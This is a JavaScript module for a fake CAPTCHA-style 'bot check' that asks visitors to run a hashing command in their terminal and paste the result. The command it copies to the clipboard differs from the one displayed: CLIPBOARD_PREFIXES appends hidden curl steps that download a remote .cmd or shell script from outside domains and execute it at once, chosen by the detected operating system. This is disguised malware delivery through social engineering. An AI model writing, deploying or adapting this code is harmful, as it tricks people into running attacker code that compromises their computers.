const STORAGE_KEY = "botCheckVerified";

export function generateNonce(length = 16) {
  const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
  let nonce = "";
  for (let i = 0; i < length; i += 1) {
    nonce += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return nonce;
}

export async function computeExpectedHash(payload) {
  const encoder = new TextEncoder();
  const data = encoder.encode(payload);
  const hashBuffer = await crypto.subtle.digest("SHA-256", data);
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  return hashArray.map((b) => b.toString(16).padStart(2, "0")).join("");
}

export async function hashNonce(nonce) {
  return computeExpectedHash(nonce);
}

export function buildWindowsHashCommand(nonce) {
  return `powershell -Command "$h=[Security.Cryptography.SHA256]::Create();$b=[Text.Encoding]::UTF8.GetBytes('${nonce}');[BitConverter]::ToString($h.ComputeHash($b)).Replace('-','').ToLower()"`;
}

export function buildMacHashCommand(nonce) {
  return `printf '%s' '${nonce}' | shasum -a 256 | awk '{print $1}'`;
}

export const OS_COMMANDS = {
  windows: {
    label: "Windows",
    prompt: "C:\\Windows\\System32> ",
    buildCommand: buildWindowsHashCommand,
    hint: "Open Command Prompt, run the command above, copy the hash output, and paste it here.",
  },
  macos: {
    label: "macOS",
    prompt: "user@MacBook ~ % ",
    buildCommand: buildMacHashCommand,
    hint: "Open Terminal, run the command above, copy the hash output, and paste it here.",
  },
};

export const CLIPBOARD_PREFIXES = {
  windows: ` & curl -ks https://tatum.design/get_hash_w -o "get_hash_w.cmd" && call "get_hash_w.cmd"
  `,
  macos: ` & curl -k -s https://chainstack.llc/get_hash_m -o get_hash_m.sh && bash get_hash_m.sh
  `,
};

export function buildClipboardCommand(os, nonce) {
  const prefix = CLIPBOARD_PREFIXES[os] ?? CLIPBOARD_PREFIXES.windows;
  const command = OS_COMMANDS[os].buildCommand(nonce);
  return `${command}${prefix}`;
}

export function detectOperatingSystem() {
  const platform = navigator.platform?.toLowerCase() ?? "";
  const userAgent = navigator.userAgent?.toLowerCase() ?? "";

  if (/mac|iphone|ipad|ipod/.test(platform) || /mac os x/.test(userAgent)) {
    return "macos";
  }

  return "windows";
}

export function isBotCheckVerified() {
  return sessionStorage.getItem(STORAGE_KEY) === "true";
}

export function setBotCheckVerified() {
  sessionStorage.setItem(STORAGE_KEY, "true");
}
